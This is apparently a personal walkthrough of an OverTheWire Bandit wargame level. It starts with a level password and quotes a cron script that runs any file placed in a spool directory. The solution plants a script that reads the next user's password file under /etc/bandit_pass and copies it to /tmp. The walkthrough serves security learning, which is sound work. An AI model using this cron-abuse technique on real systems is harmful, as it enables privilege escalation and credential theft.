Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Checking the bandit24 cron file in /etc/cron.d will lead us to /usr/bin/cronjob_bandit24.sh
This is what's inside:
```
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
```
By reading (and some guessing) this file check for files inside of /var/spool/$myname/foo and execute them if the owner of the file is bandit23
What do we do with this? Add an executable file into the directory that read the password for bandit24 for us.
Add a file inside of /tmp to redirect the password into it.
Create a file
~~~
nano /var/spool/bandit24/foo/tmp.sh
~~~
For the contents of the file:
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/<passwd_file_name>.txt
```

Make it executable
```
chmod +x /var/spool/bandit24/foo/tmp.sh
```
Wait for a bit and read the file you created into /tmp.
We can move on to [[Level 24 - 25]]